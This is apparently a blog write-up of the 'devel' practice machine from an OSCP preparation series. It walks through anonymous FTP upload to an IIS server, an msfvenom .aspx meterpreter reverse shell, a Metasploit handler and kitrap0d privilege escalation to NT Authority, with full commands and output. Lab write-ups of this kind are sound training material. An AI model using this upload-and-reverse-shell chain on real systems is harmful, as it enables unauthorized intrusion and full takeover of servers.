---
layout: post
title: "devel"
date: 2025-09-10 
categories: OSCP Playlist
---
# devel

# Summary

- Anonymous login allowed on Microsoft ftpd server
- ftp server allow uploading files
- msfvenom to generate .aspx staged meterpreter reverse shell
- metasploit listener, used post/multi/local_exploit_suggester
- raised privilege to nt authority

# Attack Path

First enumerate the open ports and services:

```bash
sudo nmap -sC -sV -oN nmap/devel 10.10.10.5

PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  02:06AM       <DIR>          aspnet_client
| 03-17-17  05:37PM                  689 iisstart.htm
|_03-17-17  05:37PM               184946 welcome.png
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-server-header: Microsoft-IIS/7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS7
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

We see from the scan anon login is allowed for ftp. Let’s login and see what files there are:

```bash
ftp 10.10.10.5

get iisstart.htm
get welcome.png

```

Let’s view what the image is:

![image.png]({{ site.baseurl }}/assets/devel/image.png)

Let’s look at its exif data:

```bash
exiftool 

ExifTool Version Number         : 13.25
File Name                       : welcome.png
Directory                       : .
File Size                       : 185 kB
File Modification Date/Time     : 2017:03:17 14:37:30+00:00
File Access Date/Time           : 2025:09:10 21:27:33+01:00
File Inode Change Date/Time     : 2025:09:10 21:27:33+01:00
File Permissions                : -rw-rw-r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 571
Image Height                    : 411
Bit Depth                       : 8
Color Type                      : RGB
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Image Size                      : 571x411
Megapixels                      : 0.235

```

Not much. Let’s use strings:

```bash
strings -n 8 welcome.png

#Nothing interesting
```

The other file downloaded also amounted to nothing.

Let’s visit the web page:

![image.png]({{ site.baseurl }}/assets/devel/image%201.png)

The same image we downloaded from ftp.

Let’s fuzz:

```bash
feroxbuster -u http://10.10.10.5/ -C 404

200      GET      826l     4457w   331772c http://10.10.10.5/welcome.png
200      GET       32l       53w      689c http://10.10.10.5/
301      GET        2l       10w      155c http://10.10.10.5/Aspnet_client => http://10.10.10.5/Aspnet_client/
301      GET        2l       10w      155c http://10.10.10.5/aspnet_Client => http://10.10.10.5/aspnet_Client/

```

Let’s use ffuf:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt:FUZZ -u http://10.10.10.5/FUZZ -ic

aspnet_client           [Status: 301, Size: 155, Words: 9, Lines: 2, Duration: 38ms]
Aspnet_client           [Status: 301, Size: 155, Words: 9, Lines: 2, Duration: 24ms]
aspnet_Client           [Status: 301, Size: 155, Words: 9, Lines: 2, Duration: 18ms]
ASPNET_CLIENT           [Status: 301, Size: 155, Words: 9, Lines: 2, Duration: 22ms]
```

Nothing. Let’s do another port scan:

```bash
rustscan -a 10.10.10.5 --ulimit 5000
```

These are the only ports. 

Let’s go back to ftp and see if we are allowed to upload files:

```bash
ftp 10.10.10.5

put test.txt

local: test.txt remote: test.txt
229 Entering Extended Passive Mode (|||49168|)
125 Data connection already open; Transfer starting.
100% |****************************************************************************************************|     8      156.25 KiB/s    --:-- ETA
226 Transfer complete.
8 bytes sent in 00:00 (0.13 KiB/s)

125 Data connection already open; Transfer starting.
03-18-17  02:06AM       <DIR>          aspnet_client
03-17-17  05:37PM                  689 iisstart.htm
09-11-25  12:03AM                    8 test.txt
03-17-17  05:37PM               184946 welcome.png

```

Let’s see if we can view it on web:

```bash
http://10.10.10.5/test.txt
```

![image.png]({{ site.baseurl }}/assets/devel/image%202.png)

Normally IIS will execute a .aspx file.  Let’s get a reverse shell on the machine. First let’s use msfvenom to generate our payload:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=4444 -f aspx -o rev.aspx

```

Now let’s upload it:

```bash
put rev.aspx

125 Data connection already open; Transfer starting.
100% |****************************************************************************************************|  1016 KiB    1.09 MiB/s    --:-- ETA
226 Transfer complete.
```

Now let’s start a listener on metasploit

```bash
msfconsole
use exploit/multi/handler
set lhost tun0
set payload windows/meterpreter/reverse_tcp
run
```

Now run visit our reverse shell:

```bash
http://10.10.10.5/rev.aspx
```

![image.png]({{ site.baseurl }}/assets/devel/image%203.png)

Let’s use msfconsole’s multi/recon/local_exploit_suggester to escalate our privilege:

```bash
msfconsole
use multi/recon/local_exploit_suggester
set SESSION 1
run
```

![image.png]({{ site.baseurl }}/assets/devel/image%204.png)

Let’s just start from the first exploit and work down the list if it does not work

```bash
use exploit/windows/local/bypassuac_comhijack #did not work
use exploit/windows/local/bypassuac_eventvwr  #did not work
exploit/windows/local/ms10_015_kitrap0d
set SESSION 1
set LHOST tun0
set LPORT 9001
run
```

![image.png]({{ site.baseurl }}/assets/devel/image%205.png)

We are now NT Authority.